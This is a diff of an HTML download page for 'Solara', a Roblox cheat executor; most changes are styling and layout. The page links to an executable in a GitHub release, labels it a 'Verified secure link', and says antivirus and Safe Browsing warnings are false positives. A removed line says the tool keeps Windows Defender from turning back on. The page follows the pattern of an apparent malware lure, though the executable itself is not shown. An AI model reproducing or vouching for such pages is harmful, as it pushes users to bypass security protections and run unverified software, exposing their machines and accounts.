@@ -3,12 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RBXHub | Solara</title>
+    <title>RBXHub | Solara Executor</title>
     <link rel="icon" type="image/png" href="favicon.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Точный хэдер с главной страницы */
+        /* Жестко фиксируем единый моноширинный шрифт для всей страницы */
+        body {
+            font-family: Consolas, monospace !important;
+            background-color: #050507;
+            color: #cbd5e1;
+        }
+
+        a:focus, button:focus {
+            outline: none !important;
+        }
+
         .header-nav {
             display: grid;
             grid-template-columns: 1fr auto 1fr;
@@ -20,7 +30,7 @@
 
         .nav-toggle {
             display: inline-flex;
-            background: #0d0e12;
+            background: #0f0f14;
             padding: 4px;
             border-radius: 12px;
             border: 1px solid rgba(255, 255, 255, 0.08);
@@ -42,9 +52,6 @@
             color: #ffffff;
         }
 
-        .logo-container {
-            text-align: center;
-        }
         .logo-text {
             font-size: 36px;
             font-weight: 900;
@@ -53,18 +60,12 @@
             letter-spacing: -0.05em;
             color: #ffffff;
             margin: 0;
-            text-decoration: none;
-            display: inline-block;
         }
         .logo-text span {
             color: #3b82f6;
             filter: drop-shadow(0 0 10px rgba(59, 130, 246, 0.5));
         }
 
-        .status-wrapper {
-            display: flex;
-            justify-content: flex-end;
-        }
         .status-badge {
             display: inline-flex;
             align-items: center;
@@ -79,19 +80,13 @@
             border: 1px solid rgba(16, 185, 129, 0.25);
             white-space: nowrap;
         }
+
         .status-dot {
             width: 8px;
             height: 8px;
             border-radius: 50%;
             background-color: #34d399;
             box-shadow: 0 0 8px #34d399;
-        }
-
-        .glass-card {
-            background: #0d0e12;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 24px;
         }
 
         @media (max-width: 768px) {
@@ -101,73 +96,113 @@
                 gap: 20px;
                 text-align: center;
             }
-            .status-wrapper {
-                justify-content: center;
+            .header-nav > div {
+                width: 100%;
+                display: flex !important;
+                justify-content: center !important;
             }
+        }
+
+        .glass { 
+            background: #0f0f14; 
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 24px;
+            transition: all 0.3s ease;
+        }
+        .glass:hover {
+            border-color: rgba(59, 130, 246, 0.3);
+        }
+
+        /* Кнопка: в обычном состоянии плоская без свечения, неон только при наведении */
+        .btn-download {
+            background-color: #1d4ed8 !important;
+            background-image: none !important;
+            color: #ffffff !important;
+            font-weight: 800 !important;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            padding: 14px 20px;
+            border-radius: 12px;
+            display: block;
+            width: 100%;
+            text-align: center;
+            text-decoration: none;
+            box-shadow: none !important;
+            filter: none !important;
+            transition: all 0.25s ease !important;
+            border: none !important;
+        }
+
+        .btn-download:hover {
+            background-color: #2563eb !important;
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(59, 130, 246, 0.7) !important;
         }
     </style>
 </head>
-<body class="bg-[#050507] text-slate-300 p-6 font-[Consolas]">
+<body class="p-6">
 
-<div class="max-w-6xl mx-auto">
+<div class="max-w-4xl mx-auto">
     <!-- Шапка сайта -->
     <header class="header-nav">
-        <div>
+        <div style="display: flex; align-items: center;">
             <div class="nav-toggle">
                 <a href="/" class="nav-btn">Exploits</a>
                 <a href="/scripts.html" class="nav-btn">Scripts</a>
             </div>
         </div>
 
-        <div class="logo-container">
-            <a href="/" class="logo-text">RBX<span>HUB</span></a>
+        <div style="text-align: center;">
+            <a href="/" style="text-decoration: none;">
+                <h1 class="logo-text">RBX<span>HUB</span></h1>
+            </a>
         </div>
 
-        <div class="status-wrapper">
+        <div style="display: flex; justify-content: flex-end;">
             <div class="status-badge">
                 <span class="status-dot"></span>
-                STATUS: ONLINE
+                STATUS: WORKING
             </div>
         </div>
     </header>
 
-    <!-- Основной контент -->
     <div class="max-w-4xl mx-auto space-y-6"> 
-        <!-- Блок скачивания -->
-        <div class="glass-card text-center">
+        <!-- Кнопка скачивания -->
+        <div class="glass text-center">
             <h2 class="text-xl font-bold text-white mb-4">Download Solara</h2>
             <a href="https://github.com/antonkoval200koval-collab/wakeupfilfy/releases/download/1.1/SolaraV3.exe" 
                target="_blank" 
                rel="nofollow noopener noreferrer" 
-               class="btn-tg block w-full py-3.5 font-bold uppercase rounded-xl transition text-center no-underline">
+               class="btn-download">
                 Download PC
             </a>
             <p class="text-[10px] text-gray-500 mt-3 uppercase tracking-wider">
-                Verified link from GitHub
+                Verified secure link from GitHub
             </p>
         </div>
-            
+        
         <!-- Картинка и описание -->
-        <div class="glass-card text-center">
+        <div class="glass text-center">
             <img src="https://obj.wearedevs.net/images/software/solara/solara-011026.webp" class="h-20 w-20 mx-auto rounded-xl mb-4 object-cover bg-gray-900 border border-gray-800">
             <p class="text-sm text-gray-400">Free and keyless executor - The first & best external executor after Hyperion.</p>
         </div>
 
         <!-- Инфо блок -->
-        <div class="glass-card">
-            <h3 class="text-lg font-bold text-white mb-4">General Info</h3>
-            <ul class="text-sm text-gray-400 space-y-2 list-disc pl-5 leading-relaxed">
-                <li>Check anti-virus/firewall if you can't Download! Due to the nature of exploits (Obfuscation, game manipulation, etc), they're falsely marked as viruses/malware. This tool may reliably prevent Windows Defender from automatically turning itself back on.</li>
+        <div class="glass p-8">
+            <h3 class="text-lg font-bold text-white mb-4">General Info & Troubleshooting</h3>
+            <ul class="text-sm text-gray-400 space-y-3 list-disc pl-5 leading-relaxed">
+                <li>Check anti-virus/firewall if you can't Download! Due to the nature of exploits (Obfuscation, game manipulation, etc), they're falsely marked as viruses/malware.</li>
                 <li>In some browsers like Google Chrome, there is a "Safe Browsing" setting that blocks certain Downloads.</li>
-                <li>Most exploits break every week. Come back to this website site often for updates and fixes.</li>
+                <li>Most exploits break every week. Come back to this website often for updates and fixes.</li>
                 <li>Use a VPN if an exploit is failing to connect to the internet for assets or updates.</li>
                 <li>Solara supports (UNC) Unified Naming Convention.</li>
             </ul>
         </div>
 
         <!-- Плашка обновления -->
-        <div class="bg-[#0d0e12] border border-gray-800 p-4 rounded-xl text-sm text-gray-400">
-            <p><strong class="text-white">🔄 Last update:</strong> September 24</p>
+        <div class="bg-[#0f0f14] border border-gray-800 p-4 rounded-xl text-sm text-gray-400">
+            <p><strong class="text-white">🔄 Last update:</strong> September 24, 2026</p>
             <p class="mt-1 italic text-gray-500 text-xs">Note: Most of our tools feature an auto-updater. Even if the date above is older, the software will check for the latest files upon launch.</p>
         </div>
     </div>
